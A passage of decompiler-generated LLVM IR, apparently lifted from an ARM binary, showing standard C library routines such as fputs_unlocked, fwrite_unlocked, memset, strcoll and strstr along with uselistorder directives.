  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 1, 2, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 12, 11, 13, 10, 3, 4, 9, 5, 14, 6, 7, 8, 16, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 2, 0, 1 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i32 908, { 1, 2, 0, 3 }
  uselistorder i32 -37504, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_157f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157f0, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_157bc, { 1, 0 }
  uselistorder label %dec_label_pc_15788, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15780, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1573c, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_156f4, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15508, { 1, 0 }
  uselistorder label %dec_label_pc_154bc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_15438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15434, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_153d4, { 1, 0 }
  uselistorder label %dec_label_pc_153d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153d4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15374, { 1, 0 }
  uselistorder label %dec_label_pc_15348, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15830 = load i32, i32* @r4, align 4
  store i32 %v3_15830, i32* %stack_var_-16, align 4
  %v6_15830 = load i32, i32* @r5, align 4
  %v9_15830 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_1583c = call i32 @strlen(i8* %arg1)
  store i32 %v3_1583c, i32* @r6, align 4
  %v0_15844 = load i32, i32* @r5, align 4
  %v0_15848 = load i32, i32* @r4, align 4
  %v5_15854 = inttoptr i32 %v0_15844 to i16*
  %v6_15854 = call i32 @__GI_fwrite_unlocked(i32 %v0_15848, i32 1, i32 %v3_1583c, i16* %v5_15854)
  %v1_15858 = load i32, i32* @r6, align 4
  %v9_15858 = icmp eq i32 %v6_15854, %v1_15858
  br i1 %v9_15858, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_15864 = phi i32 [ %v6_15854, %entry ], [ -1, %bb ]
  %v2_15860 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15860, i32* @r4, align 4
  store i32 %v6_15830, i32* @r5, align 4
  store i32 %v9_15830, i32* @r6, align 4
  ret i32 %v1_15864

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_15868 = load i32, i32* @r6, align 4
  %v12_15868 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_15870 = load i16, i16* %arg4, align 2
  %v1_15874 = and i16 %v3_15870, 192
  %v2_15878 = icmp eq i16 %v1_15874, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_15878, label %dec_label_pc_158a4, label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %entry
  %v4_15898 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_1589c = icmp eq i32 %v4_15898, 0
  br i1 %v2_1589c, label %dec_label_pc_158a4thread-pre-split, label %dec_label_pc_15904

dec_label_pc_158a4thread-pre-split:               ; preds = %dec_label_pc_15890
  %v0_158a4.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_158a4

dec_label_pc_158a4:                               ; preds = %dec_label_pc_158a4thread-pre-split, %entry
  %v0_158c8 = phi i32 [ %v0_158a4.pr, %dec_label_pc_158a4thread-pre-split ], [ %arg2, %entry ]
  %v2_158a4 = icmp eq i32 %v0_158c8, 0
  br i1 %v2_158a4, label %dec_label_pc_15904, label %bb

bb:                                               ; preds = %dec_label_pc_158a4
  %v1_158a8 = load i32, i32* @r6, align 4
  %v3_158a8 = icmp eq i32 %v1_158a8, 0
  br i1 %v3_158a8, label %dec_label_pc_15904, label %dec_label_pc_158b0

dec_label_pc_158b0:                               ; preds = %bb
  %v2_158b8 = udiv i32 -1, %v0_158c8
  %tmp9 = icmp ugt i32 %v1_158a8, %v2_158b8
  %v0_158e4 = load i32, i32* @r5, align 4
  %v1_158e4 = inttoptr i32 %v0_158e4 to i16*
  br i1 %tmp9, label %dec_label_pc_158e4, label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158b0
  store i32 %v0_158e4, i32* %r2.global-to-local, align 4
  %v2_158c8 = mul i32 %v1_158a8, %v0_158c8
  %v0_158cc = load i32, i32* @r7, align 4
  %v5_158d0 = call i32 @__stdio_fwrite(i32 %v0_158cc, i32 %v2_158c8, i16* %v1_158e4)
  %v0_158d4 = load i32, i32* @r4, align 4
  %v2_158d8 = udiv i32 %v5_158d0, %v0_158d4
  store i32 %v2_158d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15908

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158b0
  %v2_158e4 = load i16, i16* %v1_158e4, align 2
  %v1_158e8 = or i16 %v2_158e4, 8
  store i16 %v1_158e8, i16* %v1_158e4, align 2
  %v0_158f0 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_158fc = inttoptr i32 %v0_158f0 to i32*
  store i32 22, i32* %v2_158fc, align 4
  %v0_15908.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15908

dec_label_pc_15904:                               ; preds = %dec_label_pc_158a4, %dec_label_pc_15890, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15908

dec_label_pc_15908:                               ; preds = %dec_label_pc_158e4, %dec_label_pc_158c4, %dec_label_pc_15904
  %v0_15908 = phi i32 [ %v0_15908.pre, %dec_label_pc_158e4 ], [ %v2_158d8, %dec_label_pc_158c4 ], [ 0, %dec_label_pc_15904 ]
  store i32 %v9_15868, i32* @r6, align 4
  store i32 %v12_15868, i32* @r7, align 4
  ret i32 %v0_15908

; uselistorder directives
  uselistorder i16* %v1_158e4, { 0, 2, 1 }
  uselistorder i32 %v1_158a8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15908, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15904, { 2, 0, 1 }
}

define i32 @function_15918(i32 %arg1) local_unnamed_addr {
dec_label_pc_15918:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_15924 = load i32, i32* @r2, align 4
  %v8_15924 = icmp eq i32 %v0_15924, 8
  store i1 %v8_15924, i1* %cpsr_z.global-to-local, align 1
  %v5_15928 = icmp slt i32 %v0_15924, 8
  br i1 %v5_15928, label %dec_label_pc_15988, label %dec_label_pc_1592c

dec_label_pc_1592c:                               ; preds = %entry
  %v4_1592c = mul i32 %arg2, 256
  %v5_1592c = or i32 %v4_1592c, %arg2
  %v4_15930 = mul i32 %v5_1592c, 65536
  %v5_15930 = or i32 %v4_15930, %v5_1592c
  store i32 %v5_15930, i32* %r1.global-to-local, align 4
  %v1_1593457 = urem i32 %tmp, 4
  %v2_1593458 = icmp eq i32 %v1_1593457, 0
  store i1 %v2_1593458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1593458, label %dec_label_pc_15944, label %bb

bb:                                               ; preds = %dec_label_pc_1592c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1592c ]
  %v3_1593859 = phi i32 [ %v6_15938, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1592c ]
  %v4_15938 = inttoptr i32 %v3_1593859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15938, align 1
  %v5_15938 = load i32, i32* @r3, align 4
  %v6_15938 = add i32 %v5_15938, 1
  store i32 %v6_15938, i32* @r3, align 4
  %v0_1593c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15948.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1593c.pr, label %dec_label_pc_15944, label %.thread

.thread:                                          ; preds = %bb
  %v2_1593c = add i32 %v0_15948.pr.pre, -1
  store i32 %v2_1593c, i32* @r2, align 4
  %v1_15934 = urem i32 %v6_15938, 4
  %v2_15934 = icmp eq i32 %v1_15934, 0
  store i1 %v2_15934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15934, label %dec_label_pc_15944, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15938.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_15938.pre to i8
  br label %bb

dec_label_pc_15944:                               ; preds = %.thread, %bb, %dec_label_pc_1592c
  %v0_1595028 = phi i32 [ %tmp, %dec_label_pc_1592c ], [ %v6_15938, %bb ], [ %v6_15938, %.thread ]
  %v0_15948.pr = phi i32 [ %v0_15924, %dec_label_pc_1592c ], [ %v0_15948.pr.pre, %bb ], [ %v2_1593c, %.thread ]
  %v0_15944 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15944, i32* @ip, align 4
  %v8_1594810 = icmp eq i32 %v0_15948.pr, 8
  store i1 %v8_1594810, i1* %cpsr_z.global-to-local, align 1
  %v5_1594c11 = icmp slt i32 %v0_15948.pr, 8
  br i1 %v5_1594c11, label %dec_label_pc_15988, label %dec_label_pc_15950.preheader

dec_label_pc_15950.preheader:                     ; preds = %dec_label_pc_15944
  %v1_1595046 = inttoptr i32 %v0_1595028 to i32*
  store i32 %v0_15944, i32* %v1_1595046, align 4
  %v3_1595047 = add i32 %v0_1595028, 4
  %v4_1595048 = inttoptr i32 %v3_1595047 to i32*
  %v5_1595049 = load i32, i32* @ip, align 4
  store i32 %v5_1595049, i32* %v4_1595048, align 4
  %v6_1595050 = add i32 %v0_1595028, 8
  store i32 %v6_1595050, i32* @r3, align 4
  %v0_1595451 = load i32, i32* @r2, align 4
  %v1_1595452 = add i32 %v0_1595451, -8
  store i32 %v1_1595452, i32* @r2, align 4
  %v5_1595c53 = icmp slt i32 %v1_1595452, 8
  br i1 %v5_1595c53, label %dec_label_pc_15950.dec_label_pc_15988.loopexit_crit_edge, label %dec_label_pc_15960

dec_label_pc_15960:                               ; preds = %dec_label_pc_15950.preheader, %dec_label_pc_15948.dec_label_pc_15950_crit_edge
  %v6_1595055 = phi i32 [ %v6_15950, %dec_label_pc_15948.dec_label_pc_15950_crit_edge ], [ %v6_1595050, %dec_label_pc_15950.preheader ]
  %v0_1595054 = phi i32 [ %v12_1597c, %dec_label_pc_15948.dec_label_pc_15950_crit_edge ], [ %v0_1595028, %dec_label_pc_15950.preheader ]
  %v1_15960 = inttoptr i32 %v6_1595055 to i32*
  %v2_15960 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15960, i32* %v1_15960, align 4
  %v3_15960 = add i32 %v0_1595054, 12
  %v4_15960 = inttoptr i32 %v3_15960 to i32*
  %v5_15960 = load i32, i32* @ip, align 4
  store i32 %v5_15960, i32* %v4_15960, align 4
  %v6_15960 = add i32 %v0_1595054, 16
  store i32 %v6_15960, i32* @r3, align 4
  %v0_15964 = load i32, i32* @r2, align 4
  %v1_15964 = add i32 %v0_15964, -8
  store i32 %v1_15964, i32* @r2, align 4
  %v5_1596c = icmp slt i32 %v1_15964, 8
  br i1 %v5_1596c, label %dec_label_pc_15960.dec_label_pc_15988.loopexit_crit_edge, label %dec_label_pc_15970

dec_label_pc_15970:                               ; preds = %dec_label_pc_15960
  %v1_15970 = inttoptr i32 %v6_15960 to i32*
  %v2_15970 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15970, i32* %v1_15970, align 4
  %v3_15970 = add i32 %v0_1595054, 20
  %v4_15970 = inttoptr i32 %v3_15970 to i32*
  %v5_15970 = load i32, i32* @ip, align 4
  store i32 %v5_15970, i32* %v4_15970, align 4
  %v6_15970 = add i32 %v0_1595054, 24
  store i32 %v6_15970, i32* @r3, align 4
  %v0_15974 = load i32, i32* @r2, align 4
  %v1_15974 = add i32 %v0_15974, -8
  store i32 %v1_15974, i32* @r2, align 4
  %v5_1597c = icmp slt i32 %v1_15974, 8
  br i1 %v5_1597c, label %dec_label_pc_15970.dec_label_pc_15988.loopexit_crit_edge, label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %dec_label_pc_15970
  %v7_1597c = inttoptr i32 %v6_15970 to i32*
  %v8_1597c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1597c, i32* %v7_1597c, align 4
  %v9_1597c = add i32 %v0_1595054, 28
  %v10_1597c = inttoptr i32 %v9_1597c to i32*
  %v11_1597c = load i32, i32* @ip, align 4
  store i32 %v11_1597c, i32* %v10_1597c, align 4
  %v12_1597c = add i32 %v0_1595054, 32
  store i32 %v12_1597c, i32* @r3, align 4
  %v6_15980 = load i32, i32* @r2, align 4
  %v7_15980 = add i32 %v6_15980, -8
  store i32 %v7_15980, i32* @r2, align 4
  %v5_1594c = icmp slt i32 %v7_15980, 8
  br i1 %v5_1594c, label %dec_label_pc_15948.dec_label_pc_15988.loopexit_crit_edge, label %dec_label_pc_15948.dec_label_pc_15950_crit_edge

dec_label_pc_15948.dec_label_pc_15950_crit_edge:  ; preds = %dec_label_pc_15948
  %v2_15950.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15950 = inttoptr i32 %v12_1597c to i32*
  store i32 %v2_15950.pre, i32* %v1_15950, align 4
  %v3_15950 = add i32 %v0_1595054, 36
  %v4_15950 = inttoptr i32 %v3_15950 to i32*
  %v5_15950 = load i32, i32* @ip, align 4
  store i32 %v5_15950, i32* %v4_15950, align 4
  %v6_15950 = add i32 %v0_1595054, 40
  store i32 %v6_15950, i32* @r3, align 4
  %v0_15954 = load i32, i32* @r2, align 4
  %v1_15954 = add i32 %v0_15954, -8
  store i32 %v1_15954, i32* @r2, align 4
  %v5_1595c = icmp slt i32 %v1_15954, 8
  br i1 %v5_1595c, label %dec_label_pc_15950.dec_label_pc_15988.loopexit_crit_edge, label %dec_label_pc_15960

dec_label_pc_15948.dec_label_pc_15988.loopexit_crit_edge: ; preds = %dec_label_pc_15948
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15988

dec_label_pc_15950.dec_label_pc_15988.loopexit_crit_edge: ; preds = %dec_label_pc_15948.dec_label_pc_15950_crit_edge, %dec_label_pc_15950.preheader
  %v1_15954.lcssa = phi i32 [ %v1_1595452, %dec_label_pc_15950.preheader ], [ %v1_15954, %dec_label_pc_15948.dec_label_pc_15950_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15988

dec_label_pc_15960.dec_label_pc_15988.loopexit_crit_edge: ; preds = %dec_label_pc_15960
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15988

dec_label_pc_15970.dec_label_pc_15988.loopexit_crit_edge: ; preds = %dec_label_pc_15970
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15988

dec_label_pc_15988:                               ; preds = %dec_label_pc_15944, %dec_label_pc_15948.dec_label_pc_15988.loopexit_crit_edge, %dec_label_pc_15950.dec_label_pc_15988.loopexit_crit_edge, %dec_label_pc_15960.dec_label_pc_15988.loopexit_crit_edge, %dec_label_pc_15970.dec_label_pc_15988.loopexit_crit_edge, %entry
  %v0_15990 = phi i32 [ %v0_15924, %entry ], [ %v1_15974, %dec_label_pc_15970.dec_label_pc_15988.loopexit_crit_edge ], [ %v1_15964, %dec_label_pc_15960.dec_label_pc_15988.loopexit_crit_edge ], [ %v1_15954.lcssa, %dec_label_pc_15950.dec_label_pc_15988.loopexit_crit_edge ], [ %v7_15980, %dec_label_pc_15948.dec_label_pc_15988.loopexit_crit_edge ], [ %v0_15948.pr, %dec_label_pc_15944 ]
  %v2_15988 = icmp eq i32 %v0_15990, 0
  store i1 %v2_15988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15988, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15988
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_15988
  %v1_15990 = sub i32 7, %v0_15990
  store i32 %v1_15990, i32* @r2, align 4
  %v3_15994 = mul i32 %v1_15990, 4
  %v4_15994 = add i32 %v3_15994, ptrtoint (i32* @global_var_1599c.1361 to i32)
  call void @__pseudo_branch(i32 %v4_15994)
  %v0_1599c = load i32, i32* %r1.global-to-local, align 4
  %v1_1599c = trunc i32 %v0_1599c to i8
  %v2_1599c = load i32, i32* @r3, align 4
  %v3_1599c = inttoptr i32 %v2_1599c to i8*
  store i8 %v1_1599c, i8* %v3_1599c, align 1
  %v4_1599c = load i32, i32* @r3, align 4
  %v5_1599c = add i32 %v4_1599c, 1
  store i32 %v5_1599c, i32* %r3.global-to-local, align 4
  %v0_159a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_159a0 = trunc i32 %v0_159a0 to i8
  %v3_159a0 = inttoptr i32 %v5_1599c to i8*
  store i8 %v1_159a0, i8* %v3_159a0, align 1
  %v4_159a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_159a0 = add i32 %v4_159a0, 1
  store i32 %v5_159a0, i32* %r3.global-to-local, align 4
  %v0_159a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_159a4 = trunc i32 %v0_159a4 to i8
  %v3_159a4 = inttoptr i32 %v5_159a0 to i8*
  store i8 %v1_159a4, i8* %v3_159a4, align 1
  %v4_159a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_159a4 = add i32 %v4_159a4, 1
  store i32 %v5_159a4, i32* %r3.global-to-local, align 4
  %v0_159a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_159a8 = trunc i32 %v0_159a8 to i8
  %v3_159a8 = inttoptr i32 %v5_159a4 to i8*
  store i8 %v1_159a8, i8* %v3_159a8, align 1
  %v4_159a8 = load i32, i32* %r3.global-to-local, align 4
  %v5_159a8 = add i32 %v4_159a8, 1
  store i32 %v5_159a8, i32* %r3.global-to-local, align 4
  %v0_159ac = load i32, i32* %r1.global-to-local, align 4
  %v1_159ac = trunc i32 %v0_159ac to i8
  %v3_159ac = inttoptr i32 %v5_159a8 to i8*
  store i8 %v1_159ac, i8* %v3_159ac, align 1
  %v4_159ac = load i32, i32* %r3.global-to-local, align 4
  %v5_159ac = add i32 %v4_159ac, 1
  store i32 %v5_159ac, i32* %r3.global-to-local, align 4
  %v0_159b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_159b0 = trunc i32 %v0_159b0 to i8
  %v3_159b0 = inttoptr i32 %v5_159ac to i8*
  store i8 %v1_159b0, i8* %v3_159b0, align 1
  %v4_159b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_159b0 = add i32 %v4_159b0, 1
  store i32 %v5_159b0, i32* %r3.global-to-local, align 4
  %v0_159b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_159b4 = trunc i32 %v0_159b4 to i8
  %v3_159b4 = inttoptr i32 %v5_159b0 to i8*
  store i8 %v1_159b4, i8* %v3_159b4, align 1
  %v4_159b4 = load i32, i32* %r3.global-to-local, align 4
  %v5_159b4 = add i32 %v4_159b4, 1
  store i32 %v5_159b4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15950, { 1, 0 }
  uselistorder i32 %v12_1597c, { 1, 2, 0 }
  uselistorder i32 %v0_1595054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15948.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15938, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1592c, { 1, 0 }
  uselistorder i32 %v0_15924, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 10, 11, 12, 13, 7, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15988, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15960, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_15a2c = inttoptr i32 %arg2 to i8*
  %v3_15a2c = call i32 @_memcpy(i8* %v2_15a2c, i32 %arg1)
  ret i32 %v3_15a2c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15a34.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15a34 = phi i32 [ %v0_15a34.pre, %bb ], [ %v5_15a34, %bb3 ]
  %v0_15a30 = phi i32 [ %tmp, %bb ], [ %v5_15a30, %bb3 ]
  %v1_15a30 = inttoptr i32 %v0_15a30 to i8*
  %v2_15a30 = load i8, i8* %v1_15a30, align 1
  %v3_15a30 = zext i8 %v2_15a30 to i32
  store i32 %v3_15a30, i32* @r2, align 4
  %v1_15a34 = inttoptr i32 %v0_15a34 to i8*
  %v2_15a34 = load i8, i8* %v1_15a34, align 1
  %v3_15a34 = zext i8 %v2_15a34 to i32
  %v2_15a38 = icmp eq i8 %v2_15a30, 0
  br i1 %v2_15a38, label %.dec_label_pc_15a44_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15a34 = add i32 %v0_15a34, 1
  %v5_15a30 = add i32 %v0_15a30, 1
  %v10_15a3c = icmp eq i8 %v2_15a30, %v2_15a34
  br i1 %v10_15a3c, label %entry, label %dec_label_pc_15a44

.dec_label_pc_15a44_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15a44

dec_label_pc_15a44:                               ; preds = %bb3, %.dec_label_pc_15a44_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15a44_crit_edge ], [ %v3_15a30, %bb3 ]
  %v2_15a44.pre-phi = sub nsw i32 %.pn, %v3_15a34
  ret i32 %v2_15a44.pre-phi

; uselistorder directives
  uselistorder i32 %v0_15a30, { 1, 0 }
  uselistorder i32 %v0_15a34, { 1, 0 }
  uselistorder label %dec_label_pc_15a44, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15a50 = load i32, i32* @r0, align 4
  %v1_15a50 = load i32, i32* @r1, align 4
  %v2_15a50 = inttoptr i32 %v0_15a50 to i8*
  %v3_15a50 = call i32 @_memcpy(i8* %v2_15a50, i32 %v1_15a50)
  ret i32 %v3_15a50
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_15a68 = load i32, i32* @r0, align 4
  %v2_15a68 = inttoptr i32 %v0_15a68 to i8*
  %v3_15a68 = call i32 @__GI_memset(i8* %v2_15a68, i32 0)
  ret i32 %v3_15a68
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_15a74 = load i8, i8* %arg2, align 1
  %v2_15a78 = icmp eq i8 %v3_15a74, 0
  %v1_15b68.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_15a78, label %dec_label_pc_15b64, label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %entry
  %v1_15a80 = add i32 %v1_15b68.pre, -1
  store i32 %v1_15a80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a84

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15a90, %dec_label_pc_15a80
  %v0_15a84 = phi i32 [ %v1_15a84, %dec_label_pc_15a90 ], [ %v1_15a80, %dec_label_pc_15a80 ]
  %v1_15a84 = add i32 %v0_15a84, 1
  %v2_15a84 = inttoptr i32 %v1_15a84 to i8*
  %v3_15a84 = load i8, i8* %v2_15a84, align 1
  store i32 %v1_15a84, i32* %r0.global-to-local, align 4
  %v2_15a88 = icmp eq i8 %v3_15a84, 0
  br i1 %v2_15a88, label %dec_label_pc_15b60, label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a84
  %v9_15a90 = icmp eq i8 %v3_15a84, %v3_15a74
  br i1 %v9_15a90, label %dec_label_pc_15a98, label %dec_label_pc_15a84

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a90
  %v2_15a98 = add i32 %tmp, 1
  %v3_15a98 = inttoptr i32 %v2_15a98 to i8*
  %v4_15a98 = load i8, i8* %v3_15a98, align 1
  %v2_15a9c = icmp eq i8 %v4_15a98, 0
  br i1 %v2_15a9c, label %dec_label_pc_15b64, label %dec_label_pc_15aa8

dec_label_pc_15aa8:                               ; preds = %dec_label_pc_15a98
  %v1_15aa8 = add i32 %v0_15a84, 2
  %v1_15afc = add i32 %tmp, 2
  %v2_15afc = inttoptr i32 %v1_15afc to i8*
  br label %dec_label_pc_15af4

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_15b54
  %v3_15ab8 = load i8, i8* %v3_15aec.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ae4.preheader

dec_label_pc_15ae4.preheader:                     ; preds = %dec_label_pc_15ab8, %dec_label_pc_15af4
  %v0_15ae43.in = phi i8 [ %v3_15ab8, %dec_label_pc_15ab8 ], [ %v3_15aec.pn, %dec_label_pc_15af4 ]
  %v9_15ae412 = icmp eq i8 %v0_15ae43.in, %v3_15a74
  br i1 %v9_15ae412, label %dec_label_pc_15aec, label %dec_label_pc_15ac4

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15ae4.preheader, %dec_label_pc_15ae0
  %v0_15acc = phi i32 [ %v1_15ae0, %dec_label_pc_15ae0 ], [ %storemerge41, %dec_label_pc_15ae4.preheader ]
  %v0_15ac4.in = phi i8 [ %v3_15ae0, %dec_label_pc_15ae0 ], [ %v0_15ae43.in, %dec_label_pc_15ae4.preheader ]
  %v2_15ac4 = icmp eq i8 %v0_15ac4.in, 0
  br i1 %v2_15ac4, label %dec_label_pc_15b60, label %dec_label_pc_15acc

dec_label_pc_15acc:                               ; preds = %dec_label_pc_15ac4
  %v1_15acc = add i32 %v0_15acc, 1
  %v2_15acc = inttoptr i32 %v1_15acc to i8*
  %v3_15acc = load i8, i8* %v2_15acc, align 1
  store i32 %v1_15acc, i32* %r0.global-to-local, align 4
